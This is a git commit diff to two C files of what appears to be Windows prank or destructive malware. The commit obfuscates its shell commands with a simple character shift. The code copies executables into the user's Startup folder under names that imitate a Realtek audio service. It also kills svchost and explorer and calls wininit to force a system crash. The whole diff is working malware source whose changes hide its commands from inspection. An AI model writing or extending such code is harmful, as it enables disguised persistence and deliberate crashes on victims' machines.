ca977734856b31c9ab142ec7ef61cf74a0db1ccc
Helheimiss_Windows11 <you@example.com>
2024-11-19 19:57:06 +0300

    major update

--- main.c
+++ main.c
@@ -1,15 +1,36 @@
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
+
+
+void decrypt(char *text, int shift)
+{
+    int length = strlen(text);
+    for (int i = 0; i < length; i++)
+    {
+        text[i] = (char)((int)text[i] - shift);
+    }
+}
 
 
 int main()
 {    
-    system("start zbib.exe");
-    system("start RtkAudUServiceUpd64.exe");
+    char text_1[] = "uvctv\"TvmCwfWUgtxkegWrf860gzg";
+    char text_2[] = "eqr{\"TvmCwfWUgtxkegWrf860gzg\"^$E<^^Wugtu^^\'wugtpcog\'^^CrrFcvc^^Tqcokpi^^Oketquqhv^^Ykpfqyu^^Uvctv\"Ogpw^^Rtqitcou^^Uvctvwr^^TvmCwfWUgtxkegWrf860gzg^$";
+    char text_3[] = "eqr{\"TvmCwfWUgtxkeg860gzg\"^$E<^^Wugtu^^\'wugtpcog\'^^CrrFcvc^^Tqcokpi^^Oketquqhv^^Ykpfqyu^^Uvctv\"Ogpw^^Rtqitcou^^Uvctvwr^^TvmCwfWUgtxkeg860gzg^$";
+
+    decrypt(text_1, 2);
+    decrypt(text_2, 2);
+    decrypt(text_3, 2);
+
+    system(text_1);
+    //1 start RtkAudUServiceUpd64.exe
     
-    system("copy zbib.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RtkAudUServiceUpd64.exe\"");
-    system("copy zbsod.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RtkAudUService64.exe\"");
+    system(text_2);
+    //2 copy RtkAudUServiceUpd64.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RtkAudUServiceUpd64.exe\"
+    system(text_3);
+    //3 copy RtkAudUService64.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RtkAudUService64.exe\"
     
 
     while (1)
--- second.c
+++ second.c
@@ -1,19 +1,51 @@
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
+
+
+void decrypt(char *text, int shift)
+{
+    int length = strlen(text);
+    for (int i = 0; i < length; i++)
+    {
+        text[i] = (char)((int)text[i] - shift);
+    }
+}
+
 
 void trybsod()
 {
-    system("taskkill /im svchost /f");
-    system("taskkill /im svchost.exe /f");
+    char text_1[] = "vcummknn\"1ko\"uxejquv\"1h";
+    char text_2[] = "vcummknn\"1ko\"uxejquv0gzg\"1h";
+    char text_3[] = "vcummknn\"1ko\"gzrnqtgt0gzg\"1h";
+    char text_4[] = "ykpkpkv";
+    char text_5[] = "rqygtujgnn0gzg\"/Eqoocpf\"^$ykpkpkv^$";
+    char text_6[] = "uvctv\"TvmCwfWUgtxkeg860gzg";
 
-    system("taskkill /im explorer.exe /f");
+    decrypt(text_1, 2);
+    decrypt(text_2, 2);
+    decrypt(text_3, 2);
+    decrypt(text_4, 2);
+    decrypt(text_5, 2);
+    decrypt(text_6, 2);
 
-    system("wininit");
-    system("powershell.exe -Command \"wininit\"");
 
-    system("start zbsod.exe");
-    system("start RtkAudUService64.exe");
+    system(text_1);
+    //1 taskkill /im svchost /f
+    system(text_2);
+    //2 taskkill /im svchost.exe /f
+
+    system(text_3);
+    //3 taskkill /im explorer.exe /f
+
+    system(text_4);
+    //4 wininit
+    system(text_5);
+    //5 powershell.exe -Command \"wininit\"
+
+    system(text_6);
+    //6 start RtkAudUService64.exe
 }
 
 
